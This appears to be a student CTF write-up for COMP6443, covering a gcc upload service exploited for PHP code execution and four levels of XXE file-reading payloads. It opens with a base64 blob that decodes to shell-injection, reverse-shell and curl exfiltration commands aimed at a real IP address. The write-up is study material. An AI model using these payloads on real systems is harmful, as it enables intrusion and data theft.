bCAtLXVwbG9hZC1maWxlIC4vYiBodHRwczovL3RyYW5zZmVyLnNoL3JlZS5hOyBlY2hvIGhpIn1caW5wdXR7fCJ0YXIgLWN6ZiAtIC4gfCBjdXJsIC1YIFBPU1QgLWQgJyQoPC9kZXYvc3RkaW4pJyBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwIn1caW5wdXR7fCJjdXJsIC0tdXBsb2FkLWZpbGUgL2FkbWluXzUzOWY5OGJmLTlhNTItNGJjMC1iZjM0LTFmZmFiYTEwOTk3Yy5wZGYgaHR0cHM6Ly9rZWVwLnNoIn1caW5wdXR7L2ZsYWd9XGlucHV0e3wnd2hpY2ggY3VybCd9XGlucHV0e3wiZWNobyBoaSJ9XGlucHV0e3wncHl0aG9uIC1jIFwnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0 LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyOS45NC4yNDIuMTkiLDgwODApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pO1wnJ31caW5wdXR7fCJlY2hvIGxzIC0xIC8ifVxpbnB1dHt8IndoaWNoIG5jIn1c aW5wdXR7fCd3aGljaCB3Z2V0J31caW5wdXR7fCJscyAtMSAuIHwgYmFzZTY0In1caW5wdXR7fCJ3aGljaCBuZXRjYXQifVxpbnB1dHt8ImN1cmwgLWQgIkAvYWRtaW5fNTM5Zjk4YmYtOWE1Mi00YmMwLWJmMzQtMWZmYWJhMTA5OTdjLnBkZiIgLVggUE9TVCBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwL2RhdGEifVxpbnB1dHt8InRhciAtY3pmIC90bXAvaGVsbG8udGFyIC47IGN1cmwgLWQgIkAvdG1wL2hlbGxvLnRhciIgLVggUE9TVCBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwIn1caW5wdXR7fCJl Y2hvIGE+L3RtcC9oZWxsby50eHQ7IGN1cmwgLWQgIkAvdG1wL2hlbGxvLnR4dCIgLVggUE9TVCBodHRwOi8vMTI5Ljk0LjI0Mi4xOTo4MDgwIn1oZWxsbyB3b3JsZHRleHQNCmhlbGxvIHdvcmxkJ2hl bGxvI-HdvcmxkJyBTRUxFQ1QgU0xFRVAoNSl7eyB1c2VybmFtZSB9fSAiIiIgJSB7JXN9XFx7JXN9 YWRtaW57eyB1c2VyIH19e3sgLnVzZXIgfX17eyB1c2VybmFtZSB9fQ== -->

# gcc

Site: gcc.-QBSITE-

The website compiles a `.c` file for us.  
When GCC spits out warnings and errors, we can see those messages!

First, let's try upload an empty C file

```
/usr/lib/gcc/x86_64-alpine-linux-musl/8.3.0/../../../../x86_64-alpine-linux-musl/bin/ld: /usr/lib/gcc/x86_64-alpine-linux-musl/8.3.0/../../../../lib/Scrt1.o: in function `_start_c':
/home/buildozer/aports/main/musl/src/musl-1.1.20/crt/crt1.c:17: undefined reference to `main'
collect2: error: ld returned 1 exit status
```

Next we can put a syntactically incorrect C file, I just pust the word `blah`.

```
/tmp/phpljIMeC.c:5:1: error: expected '=', ',', ';', 'asm' or '__attribute__' at end of input
 blah
 ^~~~
```

We know that the C file is uploaded to the `/tmp/` directory (As PHP does...).

What about finding where the working directory of the compiler is?  

If we send a POST request to `/upload.php`, but remove the `fileToUpload` parameter we can leak the current working directory

```
Notice: Undefined index: fileToUpload in /quocca-gcc/upload.php on line 5
not c file!
```

Cool, so `upload.php` is in `/quocca-gcc/`. Probably `download.php` too.

Using the `#include` directive, we can (partially) read contents of files through their syntax errors.  

```c
#include "/quocca-gcc/upload.php"
#include "/quocca-gcc/download.php"
int main() {}
```

Sending this gives us some possible useful lines of source code.

**upload.php**

```php
/*  1 */ <?php
/*  2 */   /* ??? */
/*  3 */   ini_set("display_errors", 1);
/*  4 */   /* ??? */
/*  5 */   if (strcmp(substr($_FILES["fileToUpload"]["name"], -2), ".c") != 0) {
/*  6 */     /* ??? */
/*  7 */     /* ??? */
/*  9 */     /* ??? */
/*  8 */     $fn = basename($_FILES["fileToUpload"]["name"], ".c");
/* 10 */     /* ??? */
/* 11 */     $fileName = $_SERVER['REQUEST_TIME'] . '_' . $fn;
/* 12 */     /* ??? */
/* 13 */     echo "Running gcc...<br>";
/* 14 */     /* ??? */
/* 15 */     move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $_FILES["fileToUpload"]["tmp_name"] . ".c");
/* 16 */     /* ??? */
/* 17 */     $cmd = "gcc -o " . escapeshellarg("af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/" . $fileName) . " " . $_FILES["fileToUpload"]["tmp_name"] . ".c 2>&1";
/* 18 */     /* ??? */
/* 19 */     /* ??? */
/* 20 */     /* ??? */
/* 21 */     echo "<pre>";
/* 22 */     /* ??? */
/* 23 */     system($cmd);
/* 24 */     /* ??? */
/* 25 */     echo "</pre>";
/* 26 */     /* ??? */
/* 27 */     /* ??? */
/* 28 */     echo "saved to <a href=\"/download.php?binary=$fileName\">here</a>
/* 29 */     /* ??? */
/* 30 */ ?>
```

Some important bits of information here is...  
Line 5 - Our filename needs to end in `.c`  
Line 8 - The `.c` extension is stripped off  
Line 17 - `gcc` outputs the compiled file into the `/quocca-gcc/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/` directory.

**download.php**

```php
/*  1 */ /* ??? */
/*  2 */ /* ??? */
/*  3 */ if (strlen($f) > 0) {
/*  4 */     /* ??? */
/*  5 */     /* ??? */
/*  6 */     /* ??? */
/*  7 */     header('Content-Description: File Transfer');
/*  8 */     header('Content-Type: application/octet-stream');
/*  9 */     header('Content-Disposition: attachment; filename="'.basename($file).'"');
/* 10 */     header('Expires: 0');
/* 11 */     header('Cache-Control: must-revalidate');
/* 12 */     header('Pragma: public');
/* 13 */     header('Content-Length: ' . filesize($file));
/* 14 */     /* ??? */
/* 15 */     /* ??? */
/* 16 */     /* ??? */
/* 17 */     /* ??? */
/* 18 */     /* ??? */
/* 19 */     header('Content-Type: ctfproxy/error');
/* 20 */     echo "{\"Code\": 404, \"Description\": \"Binary not found\"}"
```

From analysing how the program runs usually, this file seems to grab a file from the `/quocca-gcc/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets`
Perhaps there's something here... but we don't know yet.

There also exists a `flag.php` file, which we can get from a recon scan.

If we just try the `#include "/quocca-gcc/flag.php` method, we don't get anything useful back.  

```
Running gcc...<br><pre>In file included from /tmp/phpNLICoA.c:3:
/quocca-gcc/flag.php:1:1: error: expected identifier or '(' before '<' token
 <?php
 ^
```

We can try another way though to get the first line...

```c
#define str(x) #x

str(
#include "/quocca-gcc/flag.php"
)
int main() {}
```

```
Running gcc...<br><pre>In file included from /tmp/phpaIcGLG.c:4:
/quocca-gcc/flag.php:3: error: unterminated argument list invoking macro "str"
 // I removed the hard-coded flag and moved it to environment variable
 
/tmp/phpaIcGLG.c:5:1: error: expected '=', ',', ';', 'asm' or '__attribute__' before ')' token
 )
 ^
```

Great, we've gotten some part of the file... but it looks like it's not in the `flag.php` file, but rather the environment variable!  
Trying directory traversal around the server with the `#include` method didn't get us very far - nothing useful that I could find.  
We can't exploit any passed variables with `upload.php:23` either as everything is escaped correctly.

Noo!!

We need a new approach!  

There are several ways to get access to environment table - but one thing in common, is that all these methods need some sort of RCE.  

In Linux, we can use the the `env` command.  
With PHP we can use `system('env')` to run the env command - or `phpinfo()` which spits out a nicely formatted webpage.  
We won't be able to use our syntax error leak technique though - as the C preprocessor won't execute any commands.  

One thing we need to realise, is that the `gcc.-QBSITE-` site serves its files from the `/quocca-gcc` directory.  
That means that `/quocca-gcc/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/` is accessible through the internet without using `download.php`!

We can test this by submitting a valid C program, and extracting the compiled filename from the compiler log.  

> i.e. `saved to <a href="/download.php?binary=1593172586_app">here</a>` -> `1593172586_app`.  
This file is accessible at `https://gcc.-QBSITE-/af381d14-a9b1-45b2-b753-d68dc37eac2b/compiled-assets/1593172586_app`.

So, what this MEANS is that, if we can put PHP code into our compiled binary, and have the filename end with `.php`, the server will execute contents of the compiled binary, thinking that it is a PHP file!

We know from `upload.php:8` that the uploaded filename must end with `.c`, but we also know that it strips off the `.c` at the end.  
This means that we can craft our filename as `something.php.c`, which would then be compiled as `something.php`!

File: `win.php.c`

```c
char *a = "<?php phpinfo(); ?>";
int main () {}
```

> `COMP6443{OMG_I_THOUGHT_THIS_WAS_6447_BUT_IT_IS_6443}`

# Feedifier

## V1

<!-- 10 minutes to get working -->

Site: v1.feedifier.-QBSITE-

RSS files are basically XML files.  
XML files can be exploited with XML External Entity attacks

```rss
<!DOCTYPE ree [
  <!ENTITY xxe SYSTEM "file:///flag_ef031e0a08a1795a5649ac7792ee9390">
]>
<rss>
	<channel>
		<item>
			<title></title>
			<link></link>
			<description>&xxe;</description>
		</item>
	</channel>
</rss>
```

> `COMP6443{XE.ejUyMDY2Nzc=.dTinBkLUSDmW2M8g0R9icA==}`

## V2

<!-- 1 hour to get working -->

Site: v2.feedifier.-QBSITE-

Version 2 of feedifier stops you from being able to use certain keywords in the requested feed.

`flag` -> Bad word detected!  
`file:/` -> Bad word detected!

But, it doesn't stop us from putting these instructions in another file that be requested!  

Using an external Document Type Definition (DTD) file, we can pass in our payload.  
We also need to use what is known as a "parameter entity".  

> These entities could only be substituted inside the XML structure. However, there is something called parameter entities which could be defined as well as called inside the DOCTYPE itself. They are denoted by "% " followed by entity name. 

**RSS**  

```xml
<?xml version="1.0" encoding="UTF-8" ?>

<!DOCTYPE a [
	<!ENTITY % ext SYSTEM "http://sandbox.server/dtd">
	%ext;
]>

<rss>
	<channel>
		<item>
			<title></title>
			<link></link>
			<description>&ext;</description>
		</item>
	</channel>
</rss>
```

**DTD**  

```xml
<!ENTITY % file SYSTEM "file:///flag_20e629e407d2d93bf15162e0ed259cf9">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '%file;'>">
%eval;
%error;
```

(Payload to trigger the XXE)  
Source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection  
Source: https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

## V3

<!-- 6 hours to get working -->

Site: v3.feedifier.-QBSITE-

This time, DTD files are also checked against the filter, which means we need to piece together the file resource string.

I tried to do some OOB - sending the flag over a GET request... but it seemed that PHP wasn't installed on the server, meaning that I couldn't use the `php://filter/convert.base64-encode` method (Some characters  in the flag can't be transmitted over the network without being encoded). But, we can still get the flag through error-based methods!

<!-- url check is done in two rounds, so custom server could just respond with a different value - ftp isn't checked. -->

**RSS**  

```xml
<?xml version="1.0" encoding="UTF-8" ?>

<!DOCTYPE data [
	<!ENTITY % file SYSTEM "http://sandbox.server/dtd">
	%file;
	%prepare;
	%send;
]>

<rss>
	<channel>
		<item>
			<title></title>
			<link></link>
			<description></description>
		</item>
	</channel>
</rss>
```

**DTD**  

```xml
<!ENTITY % A "file:">
<!ENTITY % B "///fla">
<!ENTITY % C "g_a45bd0049717dc50a366e2f5d97d743f">
<!ENTITY % PATH "%A;%B;%C;">

<!ENTITY % open_fleg '<!ENTITY &#37; fleg SYSTEM "%PATH;">'> %open_fleg;
<!ENTITY % get_fleg '<!ENTITY &#37; WINNER_WINNER_CHICKEN_DINNER SYSTEM "%fleg;">'> %get_fleg;

%WINNER_WINNER_CHICKEN_DINNER
```

> `COMP6443{XXXE.ejUyMDY2Nzc=.d3e+nYut55+DzMoeUN0J4Q==}`

## V4

<!-- 2.5 hours to get working -->

Site: v4.feedifier.-QBSITE-

> NOTES(adamyi@): It seems that this service has been sending out really weired requests to random servers and triggered internal security alert. I looked into the traffic and noted that QuoccaBank internal confinential data was exfiltrated. I don't know why this happens because my code is absolutely secure... let me call nsa to see if they know anything about this... For now, I just set up a firewall to drop those suspicious requests. I even disabled the outputs of this service. who cares if our users are getting their results back as long as we are secure I also just installed docbook (http://ftp.au.debian.org/debian/pool/main/d/docbook/docbook_4.5-6_all.deb) on the server to write a post-mortem on the data exfiltration.

<!-- there is no hacker -->
<!-- we won't encounter a hacker -->
<!-- i knew it was a hacker before anyone knew -->
<!-- no one knows hackers better than I do -->
<!-- the russians brought the hackers here -->
<!-- no one could have predicted the hacker -->
<!-- we cannot allow an hacker to stop our server. stocks looking good -->
<!-- security people spread fake news of hacker -->
<!-- some of the servers have to be hacked -->
<!-- i'm the best coder, ask anyone -->

This time, all outbound connections (apart from the feed page itself) are dropped.  
The feed output is also dropped - however like the other versions, the error messages still show - so thankfully we aren't doing this completely blind.

Parameter entities require us to use an external DTD file, however in this case we cannot, as all outbound connections are blocked. However, the hint given was that docbook is installed...  
Docbook contains local DTD files, which can be used!

The general rationale with exploiting local DTD files, is that once a entity has been defined; any new definition of the same entity is ignored.  
This means that we can define an entity, and then import a local DTD file that happens to execute/evaluate that entity. Boom injection.

In the case of this example, I overrode onto the `ISOamso` entity (which the internet suggests).  
First, load the flag, then write the error-based methods to leak the flag.

```rss
<?xml version="1.0" encoding="UTF-8" ?>

<!DOCTYPE data [
	<!ENTITY % importDocbook SYSTEM "file:///usr/share/sgml/docbook/dtd/4.5/docbookx.dtd" >
	<!ENTITY % ISOamso '<!ENTITY &#37; flag SYSTEM "file:///flag_9d88f8807d173ab2a6c2e839eef83553"><!ENTITY &#37; win "<!ENTITY &#38;#37; yeet SYSTEM &#39;&#37;flag;&#39;>">'>

	%importDocbook;
	%win;
]>

<rss>
	<channel>
		<item>
			<title></title>
			<link></link>
			<description></description>
		</item>
	</channel>
</rss>
```

Source: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd  
Source: https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

> `COMP6443{XXXXE.ejUyMDY2Nzc=.1YOhbLu1IA8hTFxe5xE04w==}`
